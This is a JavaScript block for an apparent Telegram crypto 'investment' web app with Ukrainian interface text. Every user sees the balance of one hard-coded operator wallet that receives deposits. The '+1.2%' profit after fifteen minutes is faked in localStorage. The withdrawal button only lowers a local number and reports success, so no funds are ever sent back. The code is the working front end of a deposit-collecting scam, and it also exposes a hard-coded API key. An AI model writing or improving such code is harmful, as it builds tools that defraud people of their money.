    <script>
        const BSC_API_KEY = "64NR48AURBWDN27DJUHVAQQIHAIKCBCQZ7";
        const WALLET_ADDRESS = "0x184d575D8ad2cE193347570eb43b850CfcC4Fc38";
        const USDT_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";

        let userBalance = 0.0;
        let timerInterval = null;

        // 1. Унікальний ID для кожного користувача
        function setupUser() {
            let userId = "";
            let userName = "Користувач";

            try {
                const tg = window.Telegram.WebApp;
                tg.ready();
                tg.expand();
                if (tg.initDataUnsafe?.user) {
                    userId = tg.initDataUnsafe.user.id.toString();
                    userName = tg.initDataUnsafe.user.first_name || userName;
                }
            } catch (e) {}

            if (!userId) {
                userId = localStorage.getItem('unique_user_id');
                if (!userId) {
                    userId = Math.floor(1000000 + Math.random() * 9000000).toString();
                    localStorage.setItem('unique_user_id', userId);
                }
            }

            document.getElementById('user-display-name').innerText = userName;
            document.getElementById('user-display-id').innerText = `ID: ${userId}`;
        }
        setupUser();

        function updateBalanceDisplay() {
            document.getElementById('total-balance').innerText = `$${userBalance.toFixed(4)}`;
            document.getElementById('assets-contract-val').innerText = `${userBalance.toFixed(4)} USDT`;
        }

        // 2. Отримання балансу
        async function fetchRealBalance() {
            const statusEl = document.getElementById('balance-status');
            
            // Якщо зараз триває інвестиція, не перезаписуємо заморожений баланс з блокчейну
            if (localStorage.getItem('invest_active') === 'true') {
                statusEl.innerText = 'В інвестиції';
                return;
            }

            statusEl.innerText = 'Оновлення...';
            const apiUrl = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${USDT_CONTRACT}&address=${WALLET_ADDRESS}&tag=latest&apikey=${BSC_API_KEY}`;

            try {
                const response = await fetch(apiUrl);
                const data = await response.json();

                if (data.status === "1" || data.message === "OK") {
                    const rawVal = BigInt(data.result);
                    userBalance = Number(rawVal) / 1e18; 
                    updateBalanceDisplay();
                    statusEl.innerText = 'Синхронізовано з BSC';
                } else {
                    statusEl.innerText = 'Синхронізовано';
                }
            } catch (e) {
                statusEl.innerText = 'Помилка мережі';
            }
        }

        // 3. Логіка Інвестиції та 12-годинного таймера
        function startInvestment() {
            if (userBalance <= 0) {
                alert("Недостатньо коштів на балансі для інвестиції!");
                return;
            }

            const now = Date.now();
            const twelveHoursMs = 12 * 60 * 60 * 1000;
            const fifteenMinsMs = 15 * 60 * 1000;

            const timerEndTime = now + twelveHoursMs;
            const payoutTime = now + fifteenMinsMs;
            const investedAmount = userBalance;

            // Зберігаємо стан в localStorage
            localStorage.setItem('timer_end_time', timerEndTime);
            localStorage.setItem('payout_time', payoutTime);
            localStorage.setItem('invested_amount', investedAmount);
            localStorage.setItem('invest_active', 'true');
            localStorage.setItem('payout_done', 'false');

            // Списуємо баланс
            userBalance = 0;
            updateBalanceDisplay();

            initInvestmentState();
        }

        function initInvestmentState() {
            const isInvestActive = localStorage.getItem('invest_active') === 'true';
            const timerEndTime = parseInt(localStorage.getItem('timer_end_time') || '0');
            const payoutTime = parseInt(localStorage.getItem('payout_time') || '0');
            const isPayoutDone = localStorage.getItem('payout_done') === 'true';

            const investBtn = document.getElementById('invest-btn');
            const timerText = document.getElementById('timer-text');
            const statusText = document.getElementById('invest-status-text');

            if (isInvestActive && Date.now() < timerEndTime) {
                investBtn.disabled = true;
                investBtn.querySelector('span').innerText = "В РОБОТІ";

                // Запуск відліку таймера
                if (timerInterval) clearInterval(timerInterval);
                timerInterval = setInterval(() => {
                    const now = Date.now();
                    const timeLeft = timerEndTime - now;

                    if (timeLeft <= 0) {
                        clearInterval(timerInterval);
                        localStorage.setItem('invest_active', 'false');
                        investBtn.disabled = false;
                        investBtn.querySelector('span').innerText = "ІНВЕСТУВАТИ";
                        timerText.innerText = "12:00:00";
                        statusText.innerText = "Готово до запуску";
                        fetchRealBalance();
                        return;
                    }

                    // Форматування таймера HH:MM:SS
                    const hours = Math.floor(timeLeft / (1000 * 60 * 60));
                    const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
                    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);

                    timerText.innerText = 
                        `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

                    // Перевірка 15 хвилин для повернення коштів + 1.2%
                    if (now >= payoutTime && !isPayoutDone) {
                        const investedAmount = parseFloat(localStorage.getItem('invested_amount') || '0');
                        const profitBalance = investedAmount * 1.012; // +1.2%
                        
                        userBalance = profitBalance;
                        updateBalanceDisplay();
                        localStorage.setItem('payout_done', 'true');
                        statusText.innerText = "Прибуток +1.2% заміщено!";
                        alert(`Вітаємо! 15 хвилин пройшло. Ваші кошти повернуто з прибутком +1.2% ($${profitBalance.toFixed(4)})`);
                    } else if (!isPayoutDone) {
                        const payoutLeftSec = Math.ceil((payoutTime - now) / 1000);
                        const pMin = Math.floor(payoutLeftSec / 60);
                        const pSec = payoutLeftSec % 60;
                        statusText.innerText = `Виплата +1.2% через: ${pMin}хв ${pSec}с`;
                    } else {
                        statusText.innerText = "Депозит опрацьовано (+1.2%)";
                    }

                }, 1000);

            } else {
                localStorage.setItem('invest_active', 'false');
                investBtn.disabled = false;
                investBtn.querySelector('span').innerText = "ІНВЕСТУВАТИ";
                timerText.innerText = "12:00:00";
                statusText.innerText = "Готово до запуску";
            }
        }

        // 4. Список криптовалют (Головна)
        const cryptoData = {
            'btcusdt': { name: 'BTC', price: '64250.00', change: '+1.25' },
            'ethusdt': { name: 'ETH', price: '3480.50', change: '+0.80' },
            'xrpusdt': { name: 'XRP', price: '0.5840', change: '-0.45' },
            'ltcusdt': { name: 'LTC', price: '84.20', change: '+2.10' },
            'bchusdt': { name: 'BCH', price: '380.10', change: '+1.05' },
            'qtumusdt': { name: 'QTUM', price: '3.1500', change: '-0.12' }
        };

        function renderCryptoLists() {
            for (const key in cryptoData) {
                const item = cryptoData[key];
                updateCryptoRow(key, item.price, item.change);
            }
        }

        function updateCryptoRow(symbol, price, change) {
            const isPositive = parseFloat(change) >= 0;
            const badgeClass = isPositive ? 'bg-green' : 'bg-red';
            const changeSign = isPositive ? '+' : '';
            const coinName = cryptoData[symbol]?.name || symbol.toUpperCase();

            const html = `
                <div class="crypto-info">
                    <span class="crypto-symbol">${coinName}</span>
                </div>
                <div>
                    <div class="crypto-price">$${price}</div>
                </div>
                <div class="crypto-badge ${badgeClass}">${changeSign}${change}%</div>
            `;

            let rowHome = document.getElementById(`coin-home-${symbol}`);
            if (!rowHome) {
                rowHome = document.createElement('div');
                rowHome.className = 'crypto-row';
                rowHome.id = `coin-home-${symbol}`;
                document.getElementById('home-crypto-list').appendChild(rowHome);
            }
            rowHome.innerHTML = html;
        }

        renderCryptoLists();

        try {
            const symbols = Object.keys(cryptoData);
            const ws = new WebSocket(`wss://stream.binance.com:9443/ws/${symbols.map(s => s + '@ticker').join('/')}`);

            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                const symbol = data.s.toLowerCase();
                const price = parseFloat(data.c).toFixed(symbol === 'xrpusdt' || symbol === 'qtumusdt' ? 4 : 2);
                const change = parseFloat(data.P).toFixed(2);
                updateCryptoRow(symbol, price, change);
            };
        } catch (e) {}

        // Навігація та модальні вікна
        function copyWallet() {
            const copyText = document.getElementById("my-wallet-addr");
            navigator.clipboard.writeText(copyText.value);
            alert("Адрес гаманця скопійовано!");
        }

        async function checkDeposit() {
            await fetchRealBalance();
            alert(`Поточний баланс USDT: ${userBalance.toFixed(4)}`);
            closeModal('depositModal');
        }

        function switchTab(tabId, el) {
            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
            
            document.getElementById(tabId).classList.add('active');
            if (el) el.classList.add('active');
        }

        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
        function closeModal(id) { document.getElementById(id).style.display = 'none'; }

        function submitWithdrawal() {
            const addr = document.getElementById('withdraw-addr').value;
            const amount = parseFloat(document.getElementById('withdraw-amount').value);

            if (!addr || isNaN(amount) || amount <= 0) {
                alert('Введіть коректну суму та адрес!');
                return;
            }
            if (amount > userBalance) {
                alert('Недостатньо коштів на балансі!');
                return;
            }

            userBalance -= amount;
            updateBalanceDisplay();
            closeModal('withdrawModal');
            alert(`Заявку на виведення ${amount} USDT створено!`);
        }

        // Старт додатка
        fetchRealBalance();
        initInvestmentState();
    </script>
